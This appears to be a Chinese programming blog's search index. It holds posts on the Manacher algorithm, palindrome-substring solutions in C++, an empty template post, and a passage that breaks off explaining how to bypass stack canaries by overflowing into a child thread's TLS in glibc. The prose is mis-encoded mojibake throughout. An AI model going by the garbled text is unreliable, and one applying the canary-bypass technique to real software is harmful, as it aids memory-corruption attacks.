<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Manacherç®—æ³•</title>
      <link href="/2023/04/14/manacher-suan-fa/"/>
      <url>/2023/04/14/manacher-suan-fa/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Manacherç®—æ³•ï¼Œåˆç§°ğŸæ‹‰è½¦ç®—æ³•ï¼Œæ˜¯ç”¨æ¥æ±‚è§£ï¼š</p><p>åœ¨å­—ç¬¦ä¸²strä¸­ï¼Œæ±‚å‡ºä¸€æ¡æœ€é•¿å›æ–‡å­ä¸²ï¼Œæ—¶é—´å¤æ‚åº¦O(n)ã€‚</p><h1 id="ç®—æ³•è§£æ"><a href="#ç®—æ³•è§£æ" class="headerlink" title="ç®—æ³•è§£æ"></a>ç®—æ³•è§£æ</h1><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>ä¸­å¿ƒæ‰©æ•£æ³•+åŠ é€Ÿ</p><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><h3 id="ç»Ÿä¸€å¥‡å¶é•¿åº¦é—®é¢˜"><a href="#ç»Ÿä¸€å¥‡å¶é•¿åº¦é—®é¢˜" class="headerlink" title="ç»Ÿä¸€å¥‡å¶é•¿åº¦é—®é¢˜"></a>ç»Ÿä¸€å¥‡å¶é•¿åº¦é—®é¢˜</h3><p>å¯¹äºä¸­å¿ƒæ‰©æ•£æ³•ï¼Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å¥‡æ•°é•¿åº¦çš„å›æ–‡ä¸²ä¸å¶æ•°é•¿åº¦çš„å›æ–‡ä¸²æ±‚è§£ä¸ç»Ÿä¸€ã€‚</p><p>æ¯”å¦‚ï¼šå¯¹äº<code>'abcbbcbba'</code>ï¼Œå¦‚æœæˆ‘ä»¬ä»¥æ¯ä¸ªå­—ç¬¦ä¸ºä¸­å¿ƒå‘ä¸¤è¾¹æ‰©æ•£ï¼Œåˆ™ä¼šé—å¤±é•¿åº¦ä¸ºå¶æ•°çš„å›æ–‡ä¸²ã€‚(å½“ç„¶æˆ‘ä»¬å¯ä»¥åœ¨ä»¥ç›¸é‚»å­—ç¬¦å‘ä¸¤è¾¹æ‰©æ•£ç„¶åå–æœ€å¤§å€¼)</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨å­—ç¬¦ä¸²ä¸­åŠ å…¥è¾…åŠ©å­—ç¬¦ï¼š</p><p><code>#a#b#c#b#b#c#b#b#a#</code>ï¼Œç„¶åå‘ä¸¤è¾¹æ‰©æ•£ï¼Œå¾—åˆ°çš„é•¿åº¦lené™¤2å°±æ˜¯å›æ–‡ä¸²é•¿åº¦ã€‚</p><p>å¯¹äºä¸Šè¿°å­—ç¬¦ä¸²æˆ‘ä»¬å‘ä¸¤è¾¹æ‰©æ•£ä¾æ¬¡å¾—åˆ°ï¼š<code>1 3 1 3 1 7 1 3 13 ...</code>æ‰€ä»¥æœ€é•¿å›æ–‡å­ä¸²é•¿åº¦ä¸º13/2 = 6ï¼Œå³<code>bcbbcb</code></p><h3 id="å›æ–‡ç›´å¾„ä¸å›æ–‡åŠå¾„æ•°ç»„"><a href="#å›æ–‡ç›´å¾„ä¸å›æ–‡åŠå¾„æ•°ç»„" class="headerlink" title="å›æ–‡ç›´å¾„ä¸å›æ–‡åŠå¾„æ•°ç»„"></a>å›æ–‡ç›´å¾„ä¸å›æ–‡åŠå¾„æ•°ç»„</h3><ul><li><p>å­—ç¬¦iå¯¹åº”çš„å›æ–‡ç›´å¾„ä¸ºä»¥å­—ç¬¦iä¸ºä¸­å¿ƒçš„å›æ–‡å­ä¸²çš„é•¿åº¦ï¼ˆè¿™é‡Œçš„å­—ç¬¦ä¸²æ˜¯åŠ å…¥äº†è¾…åŠ©å­—ç¬¦çš„</p></li><li><p>å›æ–‡åŠå¾„=å›æ–‡ç›´å¾„/2 + 1</p></li><li><p>å®šä¹‰å›æ–‡åŠå¾„æ•°ç»„P</p></li></ul><h3 id="æ‰©æ•£åˆ°æœ€å³è¾¹çš„å›æ–‡å³è¾¹ç•ŒR"><a href="#æ‰©æ•£åˆ°æœ€å³è¾¹çš„å›æ–‡å³è¾¹ç•ŒR" class="headerlink" title="æ‰©æ•£åˆ°æœ€å³è¾¹çš„å›æ–‡å³è¾¹ç•ŒR"></a>æ‰©æ•£åˆ°æœ€å³è¾¹çš„å›æ–‡å³è¾¹ç•ŒR</h3><p>åˆå§‹<code>int R = -1</code>ï¼Œä»å·¦å‘å³æ‰©æ•£</p><p>æ¯”å¦‚å¯¹äºï¼š<code>#a#b#c#b#b#c#b#b#a#</code></p><p>ç¬¬ä¸€æ¬¡ä»0ä½ç½®æ‰©æ•£ï¼š#  0~0       ==&gt; R=0</p><p>ç¬¬äºŒæ¬¡ä»1ä½ç½®æ‰©æ•£ï¼š#a#  0~2  ==&gt; R=2</p><p>ç¬¬ä¸‰æ¬¡ä»2ä½ç½®æ‰©æ•£ï¼š#  2~2       ==&gt; R=2</p><p>ç¬¬å››æ¬¡ä»3ä½ç½®æ‰©æ•£ï¼š#b#  2~4  ==&gt; R=4</p><p>â€¦â€¦</p><h3 id="å–å¾—æœ€è¿œå³è¾¹ç•ŒRæ—¶çš„ä¸­å¿ƒä½ç½®C"><a href="#å–å¾—æœ€è¿œå³è¾¹ç•ŒRæ—¶çš„ä¸­å¿ƒä½ç½®C" class="headerlink" title="å–å¾—æœ€è¿œå³è¾¹ç•ŒRæ—¶çš„ä¸­å¿ƒä½ç½®C"></a>å–å¾—æœ€è¿œå³è¾¹ç•ŒRæ—¶çš„ä¸­å¿ƒä½ç½®C</h3><p>åˆå§‹<code>int C = -1</code>ï¼Œä»å·¦å‘å³æ‰©æ•£</p><p>æ¯”å¦‚å¯¹äºï¼š<code>#a#b#c#b#b#c#b#b#a#</code></p><p>ç¬¬ä¸€æ¬¡ä»0ä½ç½®æ‰©æ•£ï¼š#  0~0       ==&gt; C=0</p><p>ç¬¬äºŒæ¬¡ä»1ä½ç½®æ‰©æ•£ï¼š#a#  0~2  ==&gt; C=1</p><p>ç¬¬ä¸‰æ¬¡ä»2ä½ç½®æ‰©æ•£ï¼š#  2~2       ==&gt; C=2</p><p>ç¬¬å››æ¬¡ä»3ä½ç½®æ‰©æ•£ï¼š#b#  2~4  ==&gt; C=3</p><p>â€¦â€¦</p><h2 id="ç®—æ³•åŠ é€Ÿ"><a href="#ç®—æ³•åŠ é€Ÿ" class="headerlink" title="ç®—æ³•åŠ é€Ÿ"></a>ç®—æ³•åŠ é€Ÿ</h2><p><code>str = #1#2#1#...</code>ï¼Œ<code>int R = -1</code>ï¼Œ<code>int C = -1</code></p><p>ä»å·¦å‘å³æ‰©æ•£ï¼Œè®°å½“å‰ä½ç½®ä¸‹æ ‡ä¸ºi</p><ul><li><p>1ã€è‹¥i&gt;=Rï¼Œåˆ™æš´åŠ›æ‰©</p></li><li><p>2ã€è‹¥i&lt;Rï¼Œåšå‡ºæ­¤æ—¶<code>R</code>å…³äº<code>C</code>çš„å¯¹ç§°çš„<code>L</code>ï¼Œ<code>i</code>å…³äº<code>C</code>çš„å¯¹ç§°ç‚¹<code>i'</code>ï¼Œ<strong>æ³¨æ„è¿™é‡ŒCä¸içš„ä¸ºä½ç½®å…³ç³»ä¸ç¡®å®šã€‚</strong></p><p>æ­¤æ—¶åœ¨å›æ–‡åŠå¾„æ•°ç»„Pä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°<code>i'</code>çš„å›æ–‡åŠå¾„ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®š<code>i'</code>çš„å›æ–‡åŒºåŸŸ</p><ul><li>è‹¥[Li,Ri] æ˜¯ [L,R]çš„ä¸€ä¸ªå­é›†ï¼Œåˆ™<code>i</code>çš„å›æ–‡é•¿åº¦ä¸<code>i'</code>çš„å›æ–‡åŠå¾„ç›¸ç­‰ï¼ˆç®€å•çš„å¯¹ç§°æ€§æ˜“çŸ¥</li></ul><p><img src="/2023/04/14/manacher-suan-fa/1.png"></p><ul><li>è‹¥Li&lt;Lï¼ŒRi&lt;=Rï¼Œåˆ™<code>i</code>çš„å›æ–‡åŠå¾„ä¸º<code>R-i</code></li></ul><p><img src="/2023/04/14/manacher-suan-fa/2.png"></p><ul><li>è‹¥Li=Lï¼Œåˆ™<code>i</code>çš„å›æ–‡åŠå¾„è‡³å°‘ä¸º<code>R-i</code></li></ul></li></ul><p>ä¼ªC++ä»£ç ï¼š</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">string str;//å¤„ç†åçš„å­—ç¬¦ä¸²,å¦‚ï¼š#1#2#1#int R = -1;int C = -1;int P[n];for(int i = 0; i &lt; len; i++){    if(i &gt; R){        //ä»iæš´åŠ›æ‰©æ•£ï¼Œæ›´æ–°R,C    } else {        if(Li&gt;L){            P[i] = P[i'];         } else if(Li&lt;L) {            P[i] = R-i;        } else {            //ä»Rå’Œ2i-Rå¤„å¼€å§‹æ‰©æ•£            //å¯èƒ½æ›´æ–°R,C        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Manacherç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€è§„åˆ’åˆ·é¢˜ç¯‡</title>
      <link href="/2023/04/14/dong-tai-gui-hua-shua-ti-pian/"/>
      <url>/2023/04/14/dong-tai-gui-hua-shua-ti-pian/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="æœ€é•¿å›æ–‡å­ä¸²"><a href="#æœ€é•¿å›æ–‡å­ä¸²" class="headerlink" title="æœ€é•¿å›æ–‡å­ä¸²"></a><a href="https://leetcode.cn/problems/longest-palindromic-substring/">æœ€é•¿å›æ–‡å­ä¸²</a></h1><p>ä»¥ä¸‹æ–¹æ³•ä¸­ï¼š</p><ul><li><p><strong>maxlenï¼šè¡¨ç¤ºæœ€é•¿å›æ–‡å­ä¸²çš„é•¿åº¦</strong></p></li><li><p><strong>beginï¼šè¡¨ç¤ºæœ€é•¿å›æ–‡å­ä¸²çš„èµ·å§‹ä½ç½®</strong></p></li></ul><h2 id="æš´åŠ›è§£æ³•"><a href="#æš´åŠ›è§£æ³•" class="headerlink" title="æš´åŠ›è§£æ³•"></a>æš´åŠ›è§£æ³•</h2><p>å› ä¸ºå­—ç¬¦ä¸²å¤§å°åœ¨1000ä»¥å†…ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æš´åŠ›</p><p>ä»å·¦åˆ°å³ï¼Œéå†æ¯ä¸€ä¸ªå­—ç¬¦ä½œä¸ºå›æ–‡å­ä¸²é¦–å­—ç¬¦ï¼Œç„¶ååˆ¤æ–­é•¿åº¦ä¸º2ï¼Œ3â€¦.çš„å­ä¸²æ˜¯å¦æ˜¯å›æ–‡å­ä¸²</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public://åˆ¤æ–­s[i,j]æ˜¯å¦æ˜¯å›æ–‡å­ä¸²    bool isvalid(string &amp;s, int i, int j){        int left = i;        int right = j;        while(left &lt; right){            if(s[left++] != s[right--])                return false;        }        return true;    }    string longestPalindrome(string s) {        int n = s.length();        int maxlen = 1;        int begin = 0;        for(int i=0;i&lt;n-1;i++){            for(int j=i+1;j&lt;n;j++){                if(j-i+1&gt;maxlen &amp;&amp; isvalid(s,i,j)){                    maxlen = j-i+1;                    begin = i;                }            }        }        return s.substr(begin, maxlen);    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$$<br>æ—¶é—´å¤æ‚åº¦ï¼šO(n^3)==ç©ºé—´å¤æ‚åº¦ï¼šO(1)<br>$$</p><h2 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h2><p>å¯¹äºé•¿åº¦å¤§äº2å›æ–‡ä¸²ï¼Œå»æ‰é¦–å°¾çš„å­—ç¬¦ä»ç„¶æ˜¯å›æ–‡ä¸²ã€‚å¦‚å›æ–‡ä¸²â€™abcbaâ€™ï¼Œå»æ‰ä¸¤è¾¹çš„â€™aâ€™ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†â€™bcbâ€™ä»ç„¶æ˜¯å›æ–‡ä¸²ã€‚</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²s[iâ€¦j]æ˜¯å¦æ˜¯å›æ–‡ä¸²ï¼Œæˆ‘ä»¬åªéœ€è¦ï¼š</p><ul><li>åˆ¤æ–­s[i] == s[j]ï¼Œè‹¥ä¸ç›¸ç­‰åˆ™ä¸æ˜¯å›æ–‡ä¸²ï¼Œè‹¥ç›¸ç­‰åˆ™è¿›è¡Œç¬¬2æ­¥åˆ¤æ–­</li><li>åˆ¤æ–­s[i+1,â€¦,j-1]æ˜¯å¦æ˜¯å›æ–‡ä¸²ï¼Œè‹¥æ˜¯åˆ™s[iâ€¦j]ä¹Ÿæ˜¯å›æ–‡ä¸²</li></ul><p>å®šä¹‰<code>dp[i][j]</code>ï¼šè¡¨ç¤ºs[i,â€¦,j]æ˜¯å¦æ˜¯å›æ–‡ä¸²</p><p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼šj-1 - (i+1) + 1 = j-i-1&gt;=2 ==&gt; j-i&gt;=3(ä¿è¯s[i+1,â€¦,j-1]å­ä¸²çš„é•¿åº¦ä¸å°äº2)<br>$$<br>dp[i][j]= \begin{cases}<br>false,&amp; \text{s[i] != s[j]}<br>\\ dp[i+1][j-1], &amp; \text{s[i] = s[j]}<br>\end{cases}<br>$$<br>è¾¹ç•Œæ¡ä»¶ï¼š</p><ul><li>é•¿åº¦ä¸º1çš„å­ä¸²<code>dp[i][i]</code>è‚¯å®šæ˜¯å›æ–‡ä¸²ï¼Œ<code>dp[i][i]=true</code></li><li>é•¿åº¦ä¸º2çš„å­ä¸²ï¼Œ<code>dp[i][i+1] = (s[i]==s[i+1]?true:false)</code></li></ul><p><strong>æ³¨æ„ï¼šåœ¨çŠ¶æ€è½¬ç§»æ–¹ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ˜¯ä»é•¿åº¦è¾ƒçŸ­çš„å­—ç¬¦ä¸²å‘é•¿åº¦è¾ƒé•¿çš„å­—ç¬¦ä¸²è¿›è¡Œè½¬ç§»çš„ï¼Œå› æ­¤ä¸€å®šè¦æ³¨æ„åŠ¨æ€è§„åˆ’çš„å¾ªç¯é¡ºåºã€‚</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public:    string longestPalindrome(string s) {        int n = s.length();        int maxlen = 1;        int begin = 0;        bool dp[n][n];        //é•¿åº¦ä¸º1çš„å­ä¸²ä¸€å®šæ˜¯å›æ–‡ä¸²        for(int i=0;i&lt;n;i++)             dp[i][i] = true;        //åˆ—ä¸¾å³è¾¹ç•Œ(è¿™é‡Œä¹Ÿå¯ä»¥åˆ—ä¸¾å­ä¸²é•¿åº¦ï¼Œç„¶åæ ¹æ®å·¦è¾¹ç•Œè®¡ç®—å‡ºå³è¾¹ç•Œ)        //è¿™é‡Œä¹‹æ‰€ä»¥å…ˆåˆ—ä¸¾å³è¾¹ç•Œæ˜¯å› ä¸ºå³è¾¹ç•Œå¯ä»¥é™åˆ¶é•¿åº¦ï¼Œç”±çŠ¶æ€è½¬ç§»æ–¹ç¨‹å¯çŸ¥ï¼š        //æˆ‘ä»¬è¦å…ˆåˆ¤æ–­é•¿åº¦è¾ƒå°çš„å­ä¸²æ˜¯å¦æ˜¯å›æ–‡ä¸²        for(int j=1;j&lt;n;j++){            //åˆ—ä¸¾å·¦è¾¹ç•Œ            for(int i=0;i&lt;j;i++){                if(s[i]!=s[j]){                    dp[i][j] = false;                } else {                    if(j-i&gt;=3)                        dp[i][j] = dp[i+1][j-1];                    else                           dp[i][j] = true;                }                if(dp[i][j] &amp;&amp; j-i+1&gt;maxlen){                    maxlen = j-i+1;                    begin = i;                }            }        }        return s.substr(begin, maxlen);    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$$<br>æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)==ç©ºé—´å¤æ‚åº¦ï¼šO(n^2)<br>$$</p><h2 id="ä¸­å¿ƒæ‰©æ•£æ³•"><a href="#ä¸­å¿ƒæ‰©æ•£æ³•" class="headerlink" title="ä¸­å¿ƒæ‰©æ•£æ³•"></a>ä¸­å¿ƒæ‰©æ•£æ³•</h2><p>å¯¹äºå›æ–‡ä¸²ï¼Œå…¶ç»“æ„æ˜¯è½´å¯¹ç§°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»¥æ¯ä¸€ä¸ªå­—ç¬¦ä¸ºä¸­å¿ƒå‘ä¸¤è¾¹æ‰©æ•£ï¼Œä½†æ˜¯è¿™é‡Œå¾—åˆ†ä¸¤ç§æƒ…å†µã€‚</p><ul><li>1ã€å›æ–‡ä¸²é•¿åº¦ä¸ºå¥‡æ•°ï¼šâ€™acaâ€™   ==&gt; æˆ‘ä»¬ä»¥ç¬¬2ä¸ªå­—ç¬¦å‘ä¸¤è¾¹æ‰©æ•£ï¼Œè¿”å›é•¿åº¦len1</li><li>2ã€å›æ–‡ä¸²é•¿åº¦ä¸ºå¶æ•°ï¼šâ€™accaâ€™ ==&gt; æˆ‘ä»¬ä»¥ç¬¬2ï¼Œ3ä¸ªå­—ç¬¦å‘ä¸¤è¾¹æ‰©æ•£ï¼Œè¿”å›é•¿åº¦len2</li><li>ç„¶åå–é•¿åº¦æœ€å¤§çš„é‚£ä¸ªï¼Œmaxlen=max(len1,len2)ï¼Œbegin = i - (maxlen-1)/2</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public:    //ä»i,jä½ç½®å‘ä¸¤è¾¹æ‰©æ•£    //å½“i==jæ—¶ï¼Œåˆ™æ˜¯å¥‡æ•°çš„æƒ…å†µ    //å½“i==j-1æ—¶ï¼Œåˆ™æ˜¯å¶æ•°çš„æƒ…å†µ    int find(string &amp;s, int i, int j){        int left = i;        int right = j;        while(left&gt;=0 &amp;&amp; right&lt;s.length() &amp;&amp; s[left] == s[right]){            left--,right++;        }        return right-left-1;    }    string longestPalindrome(string s) {        int n = s.length();        int maxlen = 1;        int begin = 0;                for(int i=0;i&lt;n;i++){            int len1 = find(s,i,i);            int len2 = find(s,i,i+1);            int len = max(len1,len2);            if(len&gt;maxlen){                maxlen = len;                begin = i - (maxlen-1)/2; //iå‡å»é•¿åº¦çš„ä¸€åŠå°±æ˜¯begin            }        }        return s.substr(begin, maxlen);    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$$<br>æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)==ç©ºé—´å¤æ‚åº¦ï¼šO(1)<br>$$</p><h2 id="Manacherç®—æ³•"><a href="#Manacherç®—æ³•" class="headerlink" title="Manacherç®—æ³•"></a>Manacherç®—æ³•</h2><p>è§Manacherç®—æ³•åšæ–‡&gt;_&lt;!!!</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ¨æ€è§„åˆ’é¢˜ç›®è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€è§„åˆ’æ¿å­ç¯‡</title>
      <link href="/2023/04/14/dong-tai-gui-hua-ban-zi-pian/"/>
      <url>/2023/04/14/dong-tai-gui-hua-ban-zi-pian/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ¨æ€è§„åˆ’æ¨¡å‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary-TLS</title>
      <link href="/2023/04/13/canary-tls/"/>
      <url>/2023/04/13/canary-tls/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>åœ¨linuxä¸­ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹å­çº¿ç¨‹çš„çº¿ç¨‹å±€éƒ¨å­˜å‚¨(TLS)æ¥è¾¾åˆ°ç¯¡æ”¹ canary ç›®çš„ã€‚</strong></p><h1 id="TLSå’Œthread-stack"><a href="#TLSå’Œthread-stack" class="headerlink" title="TLSå’Œthread stack"></a>TLSå’Œthread stack</h1><p>çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆThread Local Storageï¼‰æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå®ƒä¸»è¦æ˜¯ä¸ºäº†é¿å…å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿å­˜åŒä¸€å…¨å±€å˜é‡æˆ–è€…é™æ€å˜é‡æ—¶æ‰€å¯¼è‡´çš„å†²çªã€‚é€šè¿‡TLSæœºåˆ¶ï¼Œä¸ºæ¯ä¸€ä¸ªä½¿ç”¨è¯¥å…¨å±€å˜é‡çš„çº¿ç¨‹éƒ½æä¾›ä¸€ä¸ªè¯¥å˜é‡çš„å‰¯æœ¬ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹å‡å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜è‡ªå·±çš„å‰¯æœ¬ï¼Œè€Œä¸ä¼šå½±å“å…¶ä»–çº¿ç¨‹ã€‚ï¼ˆè·Ÿwindowsé‡Œé¢çš„TLSä½œç”¨ä¸€æ ·</p><p>è¿™ä¸ªæœºåˆ¶åœ¨ä¸åŒçš„æ¶æ„å’Œæ“ä½œç³»ç»Ÿä¸Šçš„å®ç°ä¸åŒï¼Œæœ¬ä¾‹å®ç°åœ¨x86-64ï¼Œglibcã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œmmapä¹Ÿè¢«ç”¨æ¥åˆ›å»ºçº¿ç¨‹ï¼Œè¿™æ„å‘³ç€å¦‚æœTLSæ¥è¿‘vulnerable addressï¼Œå®ƒå¯èƒ½ä¼šè¢«ä¿®æ”¹ã€‚åœ¨glibcå®ç°ä¸­ï¼ŒTLSè¢«æŒ‡å‘ä¸€ä¸ªsegment register fsï¼Œå®ƒçš„ç»“æ„tcbhead_tå®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the TCB.  Not necessarily the               thread descriptor used by libpthread.  */</span>  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>       <span class="token comment">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> pointer_guard<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>tcb</code> æŒ‡é’ˆå’Œ <code>self</code> æŒ‡é’ˆï¼Œå®é™…æŒ‡å‘çš„éƒ½æ˜¯åŒä¸€ä¸ªåœ°å€ï¼Œå³ <code>struct pthread</code> ç»“æ„ä½“ï¼ˆäº¦æˆ–è€…æ˜¯ <code>struct tcbhead_t</code> æœ¬èº«ï¼Œè¿™ä¸¤ä¸ªç»“æ„ä½“åœ°å€ç›¸åŒï¼‰ã€‚å®ƒåŒ…æ‹¬äº†stack_guardï¼Œå³è¢«ç§°ä½œcanaryçš„éšæœºæ•°ï¼Œç”¨æ¥é˜²æ­¢æ ˆæº¢å‡ºã€‚å®ƒçš„å·¥ä½œæ¨¡å¼æ˜¯ï¼š</p><ul><li>å½“ä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨ï¼Œcanaryä»<code>tcbhead_t.stack_guard</code>è¢«æ”¾åˆ°æ ˆä¸Šã€‚</li><li>åœ¨å‡½æ•°è°ƒç”¨ç»“æŸçš„æ—¶å€™ï¼Œæ ˆä¸Šçš„å€¼è¢«å’Œ<code>tcbhead_t.stack_guard</code>æ¯”è¾ƒï¼Œå¦‚æœä¸¤ä¸ªå€¼æ˜¯ä¸ç›¸ç­‰çš„ï¼Œå°†ä¼šç»ˆæ­¢ç¨‹åºã€‚</li></ul><p>é¦–å…ˆä¸»çº¿ç¨‹ TLS ä½ç½®<strong>è¾ƒä¸ºéšæœº</strong>ï¼Œæ‰€ä»¥æƒ³é€šè¿‡ä¿®æ”¹ä¸»çº¿ç¨‹ TLS æ¥æ”¹ä¸»çº¿ç¨‹ canary å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚</p><p>ä½†ç ”ç©¶è¡¨æ˜ï¼Œglibcåœ¨TLSå®ç°ä¸Šå­˜åœ¨é—®é¢˜ï¼Œçº¿ç¨‹åœ¨<code>pthread_create</code>çš„å¸®åŠ©ä¸‹åˆ›å»ºï¼Œç„¶åéœ€è¦ç»™è¿™ä¸ªæ–°çº¿ç¨‹é€‰æ‹©TLSã€‚</p><p><code>pthread_create</code> ä¼šåˆ›å»ºçº¿ç¨‹æ ˆï¼ˆæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªç‹¬ç«‹çš„æ ˆï¼‰ï¼Œè¿™ä¸ªæ ˆå¯ä»¥æ˜¯ç”¨å…ˆå‰çš„ç¼“å­˜ï¼ˆä¾‹å¦‚é‡ç”¨è¢«ç»ˆæ­¢çº¿ç¨‹çš„æ ˆï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ mmap å‡ºçš„ä¸€ä¸ªæ–°çš„æ ˆã€‚æœ‰è¶£çš„æ˜¯ï¼Œ<strong>æ–°çº¿ç¨‹çš„ TCB ä¼šåœ¨è¿™ä¸ªçº¿ç¨‹æ ˆä¸Šåˆ›å»º</strong>ï¼Œé‚£è¿™å°±ä½¿å¾—å­çº¿ç¨‹çš„ TCB åœ°å€å¯¹ç”¨æˆ·æ¥è¯´<strong>ä¸å†æ˜¯éšæœº</strong>çš„ï¼Œå› æ­¤<strong>å¯ä»¥é€šè¿‡å­çº¿ç¨‹çš„æ ˆæº¢å‡ºæ¥è¦†å†™å­çº¿ç¨‹ TCB çš„ Canary</strong>ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ <code>allocate_stack</code> è¿™ä¸ªä¸ºå­çº¿ç¨‹åˆ†é…æ ˆçš„å‡½æ•°ä¸­ï¼ŒTCBï¼ˆ<code>pthread</code> ç»“æ„ä½“ï¼‰å°†ä¼šè¢«æ”¾ç½®åœ¨æ•´ä¸ªçº¿ç¨‹æ ˆçš„<strong>æ ˆåº•</strong>ï¼Œå³çº¿ç¨‹æ ˆçš„æœ€åº•éƒ¨ï¼ˆä¹Ÿå°±æ˜¯æœ€é«˜åœ°å€å¤„ï¼‰å­˜æ”¾çš„æ˜¯ TCBã€‚</p><p>ç„¶å<code>THREAD_COPY_STACK_GUARD</code>è¿™ä¸ªå®è°ƒç”¨ä¼šæŠŠå½“å‰çº¿ç¨‹çš„ canary å¤åˆ¶ä¸€ä»½è¿›æ–°çº¿ç¨‹çš„ TCB ä¸­ã€‚æ³¨æ„æ§åˆ¶æµçš„åŸºæœ¬å•ä½æ˜¯çº¿ç¨‹ï¼Œè™½ç„¶æ¯ä¸ªçº¿ç¨‹çš„ canary å€¼éƒ½ç›¸åŒï¼Œä½†åœ¨éªŒè¯ canary æ—¶ï¼Œåªä¼šå»è·å–å½“å‰ TCB ä¸Šå­˜å‚¨çš„ canary 